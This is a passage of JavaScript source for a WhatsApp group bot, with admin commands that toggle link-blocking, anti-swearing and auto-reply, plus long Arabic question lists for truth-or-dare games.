fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply('Success in turning on tiktok antilink in this group')
var groupe = await ElgazarBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return m.reply('Already deactivated')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply('Success in turning off tiktok antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply('Success in turning on twitter antilink in this group')
var groupe = await ElgazarBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return m.reply('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply('Success in turning off twitter antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
              case 'antilinkall': case 'الروابط': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('نشط بالفعل')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
m.reply('النجاح في تشغيل مضاد الروابط في هذا  الجروب')
var groupe = await ElgazarBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️تحذير⚠️ 」\`\`\`\n\nتحذير للاعضاء الغير مشرفين اذا لم تكن مشرف وارسلت اي روابط سوف يتم طردك من الجروب`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return m.reply('معطل بالفعل')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
m.reply('تم ايقاف تفعيل منع الروابط')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'فتح' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'قفل' }, type: 1 }
  ]
  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `اختار من الزر\n\nفتح او\nقفل`, `${global.botname}`, m)
  }
  }
  break
case 'antitoxic': case 'السب': case 'الشتايم': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (antiToxic) return m.reply('نشط بالفعل')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
m.reply('تم تفعيل منع السب بنجاح')
var groupe = await ElgazarBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️تحذير⚠️ 」\`\`\`\n\nاي شخص سوف يسب سيتم طرده علي الفور!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return m.reply('معطل بالفعل')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
m.reply('تم ايقاف منع السب بنجاح')
} else {
  let buttonsnttoxic= [
  { buttonId: `${command} on`, buttonText: { displayText: 'فتح' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'قفل' }, type: 1 }
  ]
  await ElgazarBot.sendButtonText(m.chat, buttonsnttoxic, `اختار من الزر\n\nفتح او\nقفل`, `${global.botname}`, m)
  }
  }
  break
case 'autoreply': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (Autoreply) return m.reply('Already activated')
autorep.push(from)
fs.writeFileSync('./database/autoreply.json', JSON.stringify(autorep))
m.reply('Success in turning on auto reply in this group')
var groupe = await ElgazarBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nAuto reply has been enabled in this group, means bot may send unnecessary voice note!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Autoreply) return m.reply('Already deactivated')
let off = autorep.indexOf(from)
autorep.splice(off, 1)
fs.writeFileSync('./database/autoreply.json', JSON.stringify(autorep))
m.reply('Success in turning off auto reply in this group')
} else {
  let buttonsnttoxic= [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await ElgazarBot.sendButtonText(m.chat, buttonsnttoxic, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'antiwame': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (antiWame) return m.reply('Already activated')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
m.reply('Success in turning on antiwame in this group')
var groupe = await ElgazarBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return m.reply('Already deactivated')
let off = nttoxic.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
m.reply('Success in turning off antiwame in this group')
} else {
  let buttonsntwame = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await ElgazarBot.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'antilinkgc': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (Antilinkgc) return m.reply('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
m.reply('Success in turning on antiwame in this group')
var groupe = await ElgazarBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return m.reply('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
m.reply('Success in turning off antiwame in this group')
} else {
  let buttonsntwame = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await ElgazarBot.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'dare': case 'تويت':
              const dare =[
    "مرتبط؟ ", 
" هل بتكراش ع حد في حياتك؟", 
" ينفع نرتبط؟", 
" ممكن توريني صوره بتحبها؟", 
" ممكن نبقي صحااب ع الفيس؟", 
" هل لسه بتحب الاكس؟", 
"عندك كام اكس في حياتك؟ ", 
"ينفع تبعتلي رقمك؟ ", 
" ما تيجي اعزمني ع حاجه بحبها؟", 
"ينفع احضنك؟ ", 
"قولي ع اكبر غلطه ندمان عليهاا؟ ", 
"عندك كام سنه؟ ", 
" عامل بلوك لكام واحد عندك؟", 
" قولي سر محدش يعرفه؟", 
" عندك كام اكس في حياتك؟", 
"بتعرف تقلش وتهزر؟ ", 
" لونك المفضل هو؟", 
" مين أقرب حد ليك الفتره دي ؟", 
" قولي ع اكبر غلطه ندمان عليهاا؟", 
" مين مغنيك المفضل؟", 
" حابب تبقي اي في المستقبل؟", 
"راضي عن حياتك بنسبه كام؟ ", 
"اكتر حاجه بتلفت انتباهك في البنت او الولد؟ ", 
"اي رأيك في صوره البروفايل بتاعتي؟ ", 
" هل باين عليا اني شخص لطيف؟", 
" توافق ترجع للاكس؟", 
"ممكن تضحي بحياتك لمين؟ ", 
"سافرت بلاد برا مصر واي هي؟ ", 
" اي رأيك في صوره البروفايل بتاعتي؟", 
" هل بتعتبر نفسك حلو وبتحب شكلك؟", 
" نفسك تزور انهي بلد في العالم؟", 
" شخصيه ع السوشيال شايف انها مميزه؟", 
"عندك فوبيا من اي؟ ", 
" ممكن تورينا لينك الصراحه؟", 
"عمرك عيطت ع حاجه؟ ", 
" شايف اي أسوأ صفه فيك؟", 
"هل شلت مواد قبل كد وعدت السنه؟ ", 
"بتغير ع الل بتحبهم وبيبان عليك لو غيرت؟ ", 
"معاك كام فلوس دلوقتي؟ ", 
" بتفضل صحابك البنات ولا الولاد؟", 
" مسامح الل ظلمك؟", 
" ممثلك الافضل؟", 
" ممكن تقول رساله لحد مش هيشوفها؟", 
"انت اهلاوي ولا زملكاوي؟ ", 
" اي حيوانك المفضل؟", 
"اخر افلام شاهدتها", 
"بتعرف تكلم لغه تانيه واي هي؟ ", 
"ما هي وظفتك الحياه", 
"اعز اصدقائك ?", 
"اخر اغنية سمعتها ?", 
"تكلم عن نفسك", 
"ليه انت مش سالك", 
"ما هي عيوب سورس الجزار ؟ ", 
"اخر كتاب قرآته", 
"روايتك المفضله ?", 
"اخر اكله اكلتها", 
"اخر كتاب قرآته", 
"ليه عبدالله محمد جدع؟ ", 
 "ليه الجزار جدع؟ ", 
"افضل يوم ف حياتك", 
"ليه مضيفتش كل جهاتك", 
"حكمتك ف الحياه", 
"لون عيونك", 
"كتابك المفضل", 
"هوايتك المفضله", 
"علاقتك مع اهلك", 
" ما السيء في هذه الحياة ؟ ", 
"أجمل شيء حصل معك خلال هذا الاسبوع ؟ ", 
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس الجزار ؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس الجزار ؟ ", 
"كم مره حبيت؟ ", 
" اكثر المتابعين عندك باي برنامج؟", 
" نسبه الندم عندك للي وثقت فيهم ؟", 
"تحب ترتبط بكيرفي ولا فلات؟", 
" جربت شعور احد يحبك بس انت مو قادر تحبه؟", 
" تجامل الناس ولا اللي بقلبك على لسانك؟", 
" عمرك ضحيت باشياء لاجل شخص م يسوى ؟", 
"مغني تلاحظ أن صوته يعجب الجميع إلا أنت؟ ", 
" آخر غلطات عمرك؟ ", 
" مسلسل كرتوني له ذكريات جميلة عندك؟ ", 
" ما أكثر تطبيق تقضي وقتك عليه؟ ", 
" أول شيء يخطر في بالك إذا سمعت كلمة نجوم ؟ ", 
" قدوتك من الأجيال السابقة؟ ", 
" أكثر طبع تهتم بأن يتواجد في شريك/ة حياتك؟ ", 
"أكثر حيوان تخاف منه؟ ", 
" ما هي طريقتك في الحصول على الراحة النفسية؟ ", 
" إيموجي يعبّر عن مزاجك الحالي؟ ", 
" أكثر تغيير ترغب أن تغيّره في نفسك؟ ", 
"أكثر شيء أسعدك اليوم؟ ", 
"اي رايك في الدنيا دي ؟ ", 
"ما هو أفضل حافز للشخص؟ ", 
"ما الذي يشغل بالك في الفترة الحالية؟", 
"آخر شيء ندمت عليه؟ ", 
"شاركنا صورة احترافية من تصويرك؟ ", 
"تتابع انمي؟ إذا نعم ما أفضل انمي شاهدته ", 
"يرد عليك متأخر على رسالة مهمة وبكل برود، موقفك؟ ", 
"نصيحه تبدا ب -لا- ؟ ", 
"كتاب أو رواية تقرأها هذه الأيام؟ ", 
"فيلم عالق في ذهنك لا تنساه مِن روعته؟ ", 
"يوم لا يمكنك نسيانه؟ ", 
"شعورك الحالي في جملة؟ ", 
"كلمة لشخص بعيد؟ ", 
"صفة يطلقها عليك الشخص المفضّل؟ ", 
"أغنية عالقة في ذهنك هاليومين؟ ", 
"أكلة مستحيل أن تأكلها؟ ", 
"كيف قضيت نهارك؟ ", 
"تصرُّف ماتتحمله؟ ", 
"موقف غير حياتك؟ ", 
"اكثر مشروب تحبه؟ ", 
"القصيدة اللي تأثر فيك؟ ", 
"متى يصبح الصديق غريب ", 
"وين نلقى السعاده برايك؟ ", 
"تاريخ ميلادك؟ ", 
"قهوه و لا شاي؟ ", 
"من محبّين الليل أو الصبح؟ ", 
"حيوانك المفضل؟ ", 
"كلمة غريبة ومعناها؟ ", 
"كم تحتاج من وقت لتثق بشخص؟ ", 
"اشياء نفسك تجربها؟ ", 
"يومك ضاع على؟ ", 
"كل شيء يهون الا ؟ ", 
"اسم ماتحبه ؟ ", 
"وقفة إحترام للي إخترع ؟ ", 
"أقدم شيء محتفظ فيه من صغرك؟ ", 
"كلمات ماتستغني عنها بسوالفك؟ ", 
"وش الحب بنظرك؟ ", 
"حب التملك في شخصِيـتك ولا ؟ ", 
"تخطط للمستقبل ولا ؟ ", 
"موقف محرج ماتنساه ؟ ", 
"من طلاسم لهجتكم ؟ ", 
"اعترف باي حاجه ؟ ", 
"عبّر عن مودك بصوره ؟ ",
"اسم دايم ع بالك ؟ ", 
"اشياء تفتخر انك م سويتها ؟ ", 
" لو بكيفي كان ؟ ", 
  "أكثر جملة أثرت بك في حياتك؟ ",
  "إيموجي يوصف مزاجك حاليًا؟ ",
  "أجمل اسم بنت بحرف الباء؟ ",
  "كيف هي أحوال قلبك؟ ",
  "أجمل مدينة؟ ",
  "كيف كان أسبوعك؟ ",
  "شيء تشوفه اكثر من اهلك ؟ ",
  "اخر مره فضفضت؟ ",
  "قد كرهت احد بسبب اسلوبه؟ ",
  "قد حبيت شخص وخذلك؟ ",
  "كم مره حبيت؟ ",
  "اكبر غلطة بعمرك؟ ",
  "نسبة النعاس عندك حاليًا؟ ",
  "شرايكم بمشاهير التيك توك؟ ",
  "ما الحاسة التي تريد إضافتها للحواس الخمسة؟ ",
  "اسم قريب لقلبك؟ ",
  "مشتاق لمطعم كنت تزوره قبل الحظر؟ ",
  "أول شيء يخطر في بالك إذا سمعت كلمة (ابوي يبيك)؟ ",
  "ما أول مشروع تتوقع أن تقوم بإنشائه إذا أصبحت مليونير؟ ",
  "أغنية عالقة في ذهنك هاليومين؟ ",
  "متى اخر مره قريت قرآن؟ ",
  "كم صلاة فاتتك اليوم؟ ",
  "تفضل التيكن او السنقل؟ ",
  "وش أفضل بوت برأيك؟ ",
"كم لك بالتلي؟ ",
"وش الي تفكر فيه الحين؟ ",
"كيف تشوف الجيل ذا؟ ",
"منشن شخص وقوله، تحبني؟ ",
"لو جاء شخص وعترف لك كيف ترده؟ ",
"مر عليك موقف محرج؟ ",
"وين تشوف نفسك بعد سنتين؟ ",
"لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟ ",
"وش اجمل لهجة تشوفها؟ ",
"قد سافرت؟ ",
"افضل مسلسل عندك؟ ",
"افضل فلم عندك؟ ",
"مين اكثر يخون البنات/العيال؟ ",
"متى حبيت؟ ",
  "بالعادة متى تنام؟ ",
  "شيء من صغرك ماتغير فيك؟ ",
  "شيء بسيط قادر يعدل مزاجك بشكل سريع؟ ",
  "تشوف الغيره انانيه او حب؟ ",
"حاجة تشوف نفسك مبدع فيها؟ ",
  "مع او ضد •يسقط جمال المراة بسبب قبح لسانها؟ ",
  "عمرك بكيت على شخص مات في مسلسل ؟ ",
  "‏- هل تعتقد أن هنالك من يراقبك بشغف؟ ",
  "تدوس على قلبك او كرامتك؟ ",
  "اكثر لونين تحبهم مع بعض؟ ",
  "مع او ضد •النوم افضل حل لـ مشاكل الحياة؟ ",
  "سؤال دايم تتهرب من الاجابة عليه؟ ",
  "تحبني ولاتحب الفلوس؟ ",
  "العلاقه السريه دايماً تكون حلوه؟ ",
  "لو أغمضت عينيك الآن فما هو أول شيء ستفكر به؟ ",
"كيف ينطق الطفل اسمك؟ ",
  "ما هي نقاط الضعف في شخصيتك؟ ",
  "اكثر كذبة تقولها؟ ",
  "تيكن ولا اضبطك؟ ",
  "اطول علاقة كنت فيها مع شخص؟ ",
  "قد ندمت على شخص؟ ",
  "وقت فراغك وش تسوي؟ ",
  "عندك أصحاب كثير؟ ولا ينعد بالأصابع؟ ",
  "حاط نغمة خاصة لأي شخص؟ ",
  "وش اسم شهرتك؟ ",
  "أفضل أكلة تحبه لك؟ ",
"عندك شخص تسميه ثالث والدينك؟ ",
  "عندك شخص تسميه ثالث والدينك؟ ",
  "اذا قالو لك تسافر أي مكان تبيه وتاخذ معك شخص واحد وين بتروح ومين تختار؟ ",
  "أطول مكالمة كم ساعة؟ ",
  "تحب الحياة الإلكترونية ولا الواقعية؟ ",
  "كيف حال قلبك ؟ بخير ولا مكسور؟ ",
  "أطول مدة نمت فيها كم ساعة؟ ",
  "تقدر تسيطر على ضحكتك؟ ",
  "أول حرف من اسم الحب؟ ",
  "تحب تحافظ على الذكريات ولا تمسحه؟ ",
  "اسم اخر شخص زعلك؟ ",
"وش نوع الأفلام اللي تحب تتابعه؟ ",
  "أنت انسان غامض ولا الكل يعرف عنك؟ ",
  "لو الجنسية حسب ملامحك وش بتكون جنسيتك؟ ",
  "عندك أخوان او خوات من الرضاعة؟ ",
  "إختصار تحبه؟ ",
  "إسم شخص وتحس أنه كيف؟ ",
  "وش الإسم اللي دايم تحطه بالبرامج؟ ",
  "وش برجك؟ ",
  "لو يجي عيد ميلادك تتوقع يجيك هدية؟ ",
  "اجمل هدية جاتك وش هو؟ ",
  "الصداقة ولا الحب؟ ",
"الصداقة ولا الحب؟ ",
  "الغيرة الزائدة شك؟ ولا فرط الحب؟ ",
  "قد حبيت شخصين مع بعض؟ وانقفطت؟ ",
  "وش أخر شي ضيعته؟ ",
  "قد ضيعت شي ودورته ولقيته بيدك؟ ",
  "تؤمن بمقولة اللي يبيك مايحتار فيك؟ ",
  "سبب وجوك بالتليجرام؟ ",
  "تراقب شخص حاليا؟ ",
  "عندك معجبين ولا محد درا عنك؟ ",
  "لو نسبة جمالك بتكون بعدد شحن جوالك كم بتكون؟ ",
  "أنت محبوب بين الناس؟ ولاكريه؟ ",
"كم عمرك؟ ",
  "لو يسألونك وش اسم امك تجاوبهم ولا تسفل فيهم؟ ",
  "تؤمن بمقولة الصحبة تغنيك الحب؟ ",
  "وش مشروبك المفضل؟ ",
  "قد جربت الدخان بحياتك؟ وانقفطت ولا؟ ",
  "أفضل وقت للسفر؟ الليل ولا النهار؟ ",
  "انت من النوع اللي تنام بخط السفر؟ ",
  "عندك حس فكاهي ولا نفسية؟ ",
  "تبادل الكراهية بالكراهية؟ ولا تحرجه بالطيب؟ ",
  "أفضل ممارسة بالنسبة لك؟ ",
  "لو قالو لك تتخلى عن شي واحد تحبه بحياتك وش يكون؟ ",
"لو احد تركك وبعد فتره يحاول يرجعك بترجع له ولا خلاص؟ ",
  "برأيك كم العمر المناسب للزواج؟ ",
  "اذا تزوجت بعد كم بتخلف عيال؟ ",
  "فكرت وش تسمي أول اطفالك؟ ",
  "من الناس اللي تحب الهدوء ولا الإزعاج؟ ",
  "الشيلات ولا الأغاني؟ ",
  "عندكم شخص مطوع بالعايلة؟ ",
  "تتقبل النصيحة من اي شخص؟ ",
  "اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟ ",
  "جربت شعور احد يحبك بس انت مو قادر تحبه؟ ",
  "دايم قوة الصداقة تكون بإيش؟ ",
"أفضل البدايات بالعلاقة بـ وش؟ ",
  "وش مشروبك المفضل؟ او قهوتك المفضلة؟ ",
  "تحب تتسوق عبر الانترنت ولا الواقع؟ ",
  "انت من الناس اللي بعد ماتشتري شي وتروح ترجعه؟ ",
  "أخر مرة بكيت متى؟ وليش؟ ",
  "عندك الشخص اللي يقلب الدنيا عشان زعلك؟ ",
  "أفضل صفة تحبه بنفسك؟ ",
  "كلمة تقولها للوالدين؟ ",
  "أنت من الناس اللي تنتقم وترد الاذى ولا تحتسب الأجر وتسامح؟ ",
  "كم عدد سنينك بالتليجرام؟ ",
  "تحب تعترف ولا تخبي؟ ",
"انت من الناس الكتومة ولا تفضفض؟ ",
  "أنت بعلاقة حب الحين؟ ",
  "عندك اصدقاء غير جنسك؟ ",
  "أغلب وقتك تكون وين؟ ",
  "لو المقصود يقرأ وش بتكتب له؟ ",
  "تحب تعبر بالكتابة ولا بالصوت؟ ",
  "عمرك كلمت فويس احد غير جنسك؟ ",
  "لو خيروك تصير مليونير ولا تتزوج الشخص اللي تحبه؟ ",
  "لو عندك فلوس وش السيارة اللي بتشتريها؟ ",
  "كم أعلى مبلغ جمعته؟ ",
  "اذا شفت احد على غلط تعلمه الصح ولا تخليه بكيفه؟ ",
"قد جربت تبكي فرح؟ وليش؟ ",
  "تتوقع إنك بتتزوج اللي تحبه؟ ",
  "ما هو أمنيتك؟ ",
  "وين تشوف نفسك بعد خمس سنوات؟ ",
  "هل انت حرامي تويت بتعت عبدالله محمد؟ ",
  "لو خيروك تقدم الزمن ولا ترجعه ورا؟ ",
  "لعبة قضيت وقتك فيه بالحجر المنزلي؟ ",
  "تحب تطق الميانة ولا ثقيل؟ ",
  "باقي معاك للي وعدك ما بيتركك؟ ",
  "اول ماتصحى من النوم مين تكلمه؟ ",
  "عندك الشخص اللي يكتب لك كلام كثير وانت نايم؟ ",
  "قد قابلت شخص تحبه؟ وولد ولا بنت؟ ",
   "هل انت تحب عبدالله محمد؟ ",
"اذا قفطت احد تحب تفضحه ولا تستره؟ ",
  "كلمة للشخص اللي يسب ويسطر؟ ",
  "آية من القران تؤمن فيه؟ ",
  "تحب تعامل الناس بنفس المعاملة؟ ولا تكون أطيب منهم؟ ",
"حاجة ودك تغيرها هالفترة؟ ",
  "كم فلوسك حاليا وهل يكفيك ام لا؟ ",
  "وش لون عيونك الجميلة؟ ",
  "من الناس اللي تتغزل بالكل ولا بالشخص اللي تحبه بس؟ ",
  "اذكر موقف ماتنساه بعمرك؟ ",
  "وش حاب تقول للاشخاص اللي بيدخل حياتك؟ ",
  "ألطف شخص مر عليك بحياتك؟ ",
   "هل عبدالله محمد لطيف؟ ",
"انت من الناس المؤدبة ولا نص نص؟ ",
  "كيف الصيد معاك هالأيام ؟ وسنارة ولاشبك؟ ",
  "لو الشخص اللي تحبه قال بدخل حساباتك بتعطيه ولا تكرشه؟ ",
  "أكثر شي تخاف منه بالحياه وش؟ ",
  "اكثر المتابعين عندك باي برنامج؟ ",
  "متى يوم ميلادك؟ ووش الهدية اللي نفسك فيه؟ ",
  "قد تمنيت شي وتحقق؟ ",
  "قلبي على قلبك مهما صار لمين تقولها؟ ",
  "وش نوع جوالك؟ واذا بتغيره وش بتأخذ؟ ",
  "كم حساب عندك بالتليجرام؟ ",
  "متى اخر مرة كذبت؟ ",
"كذبت في الاسئلة اللي مرت عليك قبل شوي؟ ",
  "تجامل الناس ولا اللي بقلبك على لسانك؟ ",
  "قد تمصلحت مع أحد وليش؟ ",
  "وين تعرفت على الشخص اللي حبيته؟ ",
  "قد رقمت او احد رقمك؟ ",
  "وش أفضل لعبته بحياتك؟ ",
  "أخر شي اكلته وش هو؟ ",
  "حزنك يبان بملامحك ولا صوتك؟ ",
  "لقيت الشخص اللي يفهمك واللي يقرا افكارك؟ ",
  "فيه شيء م تقدر تسيطر عليه ؟ ",
  "منشن شخص متحلطم م يعجبه شيء؟ ",
"اكتب تاريخ مستحيل تنساه ",
  "شيء مستحيل انك تاكله ؟ ",
  "تحب تتعرف على ناس جدد ولا مكتفي باللي عندك ؟ ",
  "انسان م تحب تتعامل معاه ابداً ؟ ",
  "شيء بسيط تحتفظ فيه؟ ",
  "فُرصه تتمنى لو أُتيحت لك ؟ ",
   "لي عبدالله محمد ناك اليكس؟ ",
  "شيء مستحيل ترفضه ؟. ",
  "لو زعلت بقوة وش بيرضيك ؟ ",
  "تنام بـ اي مكان ، ولا بس غرفتك ؟ ",
  "ردك المعتاد اذا أحد ناداك ؟ ",
  "مين الي تحب يكون مبتسم دائما ؟ ",
" إحساسك في هاللحظة؟ ",
  "وش اسم اول شخص تعرفت عليه فالتلقرام ؟ ",
  "اشياء صعب تتقبلها بسرعه ؟ ",
  "شيء جميل صار لك اليوم ؟ ",
  "اذا شفت شخص يتنمر على شخص قدامك شتسوي؟ ",
  "يهمك ملابسك تكون ماركة ؟ ",
  "ردّك على شخص قال (أنا بطلع من حياتك)؟. ",
  "مين اول شخص تكلمه اذا طحت بـ مصيبة ؟ ",
  "تشارك كل شي لاهلك ولا فيه أشياء ما تتشارك؟ ",
  "كيف علاقتك مع اهلك؟ رسميات ولا ميانة؟ ",
  "عمرك ضحيت باشياء لاجل شخص م يسوى ؟ ",
"اكتب سطر من اغنية او قصيدة جا فـ بالك ؟ ",
  "شيء مهما حطيت فيه فلوس بتكون مبسوط ؟ ",
  "مشاكلك بسبب ؟ ",
  "نسبه الندم عندك للي وثقت فيهم ؟ ",
  "اول حرف من اسم شخص تقوله? بطل تفكر فيني ابي انام؟ ",
  "اكثر شيء تحس انه مات ف مجتمعنا؟ ",
  "لو صار سوء فهم بينك وبين شخص هل تحب توضحه ولا تخليه كذا  لان مالك خلق توضح ؟ ",
  "كم عددكم بالبيت؟ ",
  "عادي تتزوج من برا القبيلة؟ ",
  "أجمل شي بحياتك وش هو؟ ",
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`)
              ElgazarBot.sendMessage(from, { image: bufferdare, caption: '*♚ مرحبا بك في قسم تويت*\nꔹ━━━━━ꔹ\n'+ xeondare }, {quoted:m})
              break
                            break
       case 'truth': case 'خيروك':
              const truth =[
    "لو خيروك |  بين الإبحار لمدة أسبوع كامل أو السفر على متن طائرة لـ 3 أيام متواصلة؟ ",
"لو خيروك |  بين شراء منزل صغير أو استئجار فيلا كبيرة بمبلغ معقول؟ ",
"لو خيروك |  أن تعيش قصة فيلم هل تختار الأكشن أو الكوميديا؟ ",
"لو خيروك |  بين تناول البيتزا وبين الآيس كريم وذلك بشكل دائم؟ ",
"لو خيروك |  بين إمكانية تواجدك في الفضاء وبين إمكانية تواجدك في البحر؟ ",
"لو خيروك |  بين تغيير وظيفتك كل سنة أو البقاء بوظيفة واحدة طوال حياتك؟ ",
"لو خيروك |  أسئلة محرجة أسئلة صراحة ماذا ستختار؟ ",
"لو خيروك |  بين الذهاب إلى الماضي والعيش مع جدك أو بين الذهاب إلى المستقبل والعيش مع أحفادك؟ ",
"لو كنت شخص آخر هل تفضل البقاء معك أم أنك ستبتعد عن نفسك؟ ",
"لو خيروك |  بين الحصول على الأموال في عيد ميلادك أو على الهدايا؟ ",
"لو خيروك |  بين القفز بمظلة من طائرة أو الغوص في أعماق البحر؟ ",
"لو خيروك |  بين الاستماع إلى الأخبار الجيدة أولًا أو الاستماع إلى الأخبار السيئة أولًا؟ ",
"لو خيروك |  بين أن تكون رئيس لشركة فاشلة أو أن تكون موظف في شركة ناجحة؟ ",
"لو خيروك |  بين أن يكون لديك جيران صاخبون أو أن يكون لديك جيران فضوليون؟ ",
